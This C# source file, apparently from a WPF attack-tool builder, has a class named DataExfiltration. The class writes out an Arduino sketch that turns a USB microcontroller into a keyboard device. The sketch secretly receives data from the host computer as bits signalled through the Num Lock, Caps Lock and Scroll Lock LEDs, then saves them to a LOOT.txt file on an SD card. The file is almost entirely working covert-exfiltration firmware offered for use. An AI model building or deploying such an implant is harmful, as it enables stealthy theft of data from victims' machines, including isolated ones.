using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace WpfApp2.Classes
{
    internal class DataExfiltration
    {
        public string Path = "test";

        public string DataExfiltrationSketch()
        {
            try
            {
                if (!Directory.Exists(Path))
                {
                    Directory.CreateDirectory(Path);
                }
                string sketch =
"#include \"HID-Project.h\"\n" +
"#include <SPI.h>\n" +
"#include <SD.h>\n" +
"#include \"time.h\"\n" +
"#define SD_CS 4\n" +
"#define ScrollLockChanged(previous, current) (previous ^ current)\n\n" +
"void setup()\n" +
"{\n" +
"  delay(1000);\n" +
"  Serial.begin(9600);\n" +
"  while (!Serial);\n" +
"  ResetAllLeds();\n" +
"  while (!SD.begin(SD_CS))\n" +
"  {\n" +
"    delay(100);\n" +
"  }\n" +
"  File LOOT_File = SD.open(\"LOOT.txt\", FILE_WRITE);\n" +
"  BootKeyboard.begin();\n" +
"  String data = \"\";\n" +
"  uint8_t leds;\n" +
"  long c_i = 0;\n" +
"  bool flag = true;\n" +
"  bool pre_clock_state;\n" +
"  bool current_clock_state = ScrollLockStatus();\n" +
"  unsigned long start = 0, end, elapsed;\n" +
"  while (flag)\n" +
"  {\n" +
"    start = millis();\n" +
"    do {\n" +
"      delay(50);\n" +
"      end = millis();\n" +
"      elapsed = end - start;\n" +
"      if (elapsed >= 5000) {\n" +
"        LOOT_File.close();\n" +
"        Keyboard.press(KEY_LEFT_GUI);\n" +
"        Keyboard.release(KEY_LEFT_GUI);\n" +
"        return;\n" +
"      }\n" +
"    } while (ScrollLockStatus() == 0);\n" +
"    leds = BootKeyboard.getLeds();\n" +
"    if ((leds & LED_NUM_LOCK) != 0)\n" +
"    {\n" +
"      c_i++;\n" +
"      data += \"1\";\n" +
"      LOOT_File.write(\"1\");\n" +
"    }\n" +
"    else\n" +
"    {\n" +
"      c_i++;\n" +
"      LOOT_File.write(\"0\");\n" +
"    }\n" +
"    if ((leds & LED_CAPS_LOCK) != 0)\n" +
"    {\n" +
"      c_i++;\n" +
"      LOOT_File.write(\"1\");\n" +
"    }\n" +
"    else\n" +
"    {\n" +
"      c_i++;\n" +
"      LOOT_File.write(\"0\");\n" +
"    }\n" +
"    if (ScrollLockStatus() != 0)\n" +
"    {\n" +
"      Keyboard.press(KEY_SCROLL_LOCK);\n" +
"      Keyboard.release(KEY_SCROLL_LOCK);\n" +
"    }\n" +
"  }\n" +
"}\n\n" +
"void loop()\n" +
"{\n" +
"}\n\n" +
"bool ScrollLockStatus()\n" +
"{\n" +
"  uint8_t leds = BootKeyboard.getLeds();\n" +
"  return ((leds & LED_SCROLL_LOCK) != 0);\n" +
"}\n\n" +
"void ResetAllLeds()\n" +
"{\n" +
"  uint8_t leds = BootKeyboard.getLeds();\n" +
"  if (leds & LED_NUM_LOCK)\n" +
"  {\n" +
"    Keyboard.press(KEY_NUM_LOCK);\n" +
"    Keyboard.release(KEY_NUM_LOCK);\n" +
"  }\n" +
"  if (leds & LED_CAPS_LOCK)\n" +
"  {\n" +
"    Keyboard.press(KEY_CAPS_LOCK);\n" +
"    Keyboard.release(KEY_CAPS_LOCK);\n" +
"  }\n" +
"  if (leds & LED_SCROLL_LOCK)\n" +
"  {\n" +
"    Keyboard.press(KEY_SCROLL_LOCK);\n" +
"    Keyboard.release(KEY_SCROLL_LOCK);\n" +
"  }\n" +
"}\n";

                File.WriteAllText(@"test\test.ino", sketch);
                //Console.WriteLine("done");

                return "Script Is Ready to be compiled";
            }
            catch (Exception ex)
            {
                return $"Error: Script Building Failed{ex}";
            }

        }
    }
}
